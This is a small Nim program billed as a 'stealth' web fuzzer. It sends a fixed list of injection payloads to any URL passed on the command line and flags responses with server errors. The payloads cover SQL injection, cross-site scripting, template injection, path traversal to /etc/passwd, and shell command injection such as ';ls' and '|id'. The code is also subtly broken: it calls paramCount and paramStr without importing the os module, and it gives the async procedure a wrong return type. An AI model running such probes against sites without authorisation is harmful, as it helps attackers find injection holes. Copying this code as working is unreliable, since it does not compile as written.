## SNAPESCAPE Nim Stealth Fuzzer

import std/[asyncdispatch, httpclient, strutils, sequtils]

type
  FuzzResult* = object
    url*: string
    payload*: string
    status*: int
    interesting*: bool

const payloads* = [
  "'", "\"", "<script>", "{{7*7}}", "${7*7}",
  "../../../etc/passwd", "%00", "%0a%0d", ";ls", "|id",
  "' OR 1=1--", "<img src=x onerror=alert(1)>",
]

proc fuzzUrl*(target: string): seq[FuzzResult] {.async.} =
  let client = newAsyncHttpClient()
  for p in payloads:
    let url = target & (if "?" in target: "&f=" else: "?f=") & p
    try:
      let resp = await client.get(url)
      result.add FuzzResult(url: url, payload: p, status: resp.code.int,
        interesting: resp.code.int >= 500)
    except:
      discard
  client.close()

when isMainModule:
  let target = if paramCount() > 0: paramStr(1) else: "http://localhost"
  echo $(waitFor fuzzUrl(target))
